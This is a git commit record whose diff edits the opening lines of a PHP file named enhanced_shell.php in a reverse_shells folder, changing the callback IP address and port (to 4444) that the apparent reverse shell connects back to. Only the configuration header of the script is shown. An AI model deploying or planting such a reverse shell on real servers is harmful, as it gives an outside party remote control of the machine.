ffefd8d0faee9033255f04386c1aebe832916070
phanta1313 <ilyas.9murka9.ev@gmail.com>
2026-01-18 23:10:38 -0500

    lorem4

--- reverse_shells/enhanced_shell.php
+++ reverse_shells/enhanced_shell.php
@@ -1,8 +1,8 @@
 <?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = "192.168.196.224";  // CHANGE THIS
-$port = 4141;       // CHANGE THIS
+$ip = "192.168.130.31";  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
